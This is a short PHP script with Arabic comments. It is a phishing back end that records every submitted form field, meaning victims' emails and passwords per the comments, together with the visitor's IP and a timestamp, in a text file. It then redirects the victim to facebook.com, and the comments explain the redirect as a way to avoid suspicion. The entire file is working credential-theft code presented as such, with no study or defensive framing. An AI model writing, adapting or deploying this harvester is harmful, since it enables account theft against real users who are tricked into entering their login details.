<?php
// فتح ملف النصي لحفظ الضحايا
$file = fopen("usernames.txt", "a");

// كتابة الوقت والـ IP
fwrite($file, "Time: " . date('Y-m-d H:i:s') . " | IP: " . $_SERVER['REMOTE_ADDR'] . "\n");

// سحب الإيميل والباسورد من الصفحة
foreach($_POST as $key => $value) {
    fwrite($file, $key . " : " . $value . "\n");
}

fwrite($file, "--------------------------------\n");
fclose($file);

// تحويل الضحية للموقع الحقيقي بعد السرقة لإبعاد الشبهة
header("Location: https://www.facebook.com/");
exit();
?>
